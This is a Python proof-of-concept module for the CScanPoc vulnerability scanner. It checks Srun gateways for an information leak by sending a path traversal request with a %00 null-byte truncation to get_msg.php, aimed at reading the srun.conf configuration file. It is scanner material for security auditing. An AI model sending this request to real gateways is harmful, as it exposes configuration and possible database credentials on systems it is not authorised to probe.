# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '28da7f1c-799f-4e53-bbde-fe1eebf5992e'
    name = 'Srun网关 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        Srun网关 /get_msg.php?action=rad_client&msg_id=../srun3/etc/srun.conf%00' 可被%00截断，造成信息泄露。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '深澜软件'  # 漏洞应用名称
    product_version = 'Srun网关'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0221d322-3f44-43c6-85f9-1eaf5813fde2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            poc = arg + '/get_msg.php?action=rad_client&msg_id=../srun3/etc/srun.conf%00'
            code, head, res, errcode, _ = hh.http(poc)

            if code ==200 and 'dbname' in res and 'is_checkout' in res:
                #security_hole("Srun_3000 Gate vulnerable!:" + poc)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
